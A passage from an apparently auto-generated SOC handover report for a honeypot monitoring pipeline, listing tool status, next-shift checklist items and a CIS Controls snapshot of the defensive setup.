| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 71 priority case(s) shown individually · 19 recon entry/entries in table (7 group(s) consolidating 23 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-03T21:12:39Z_
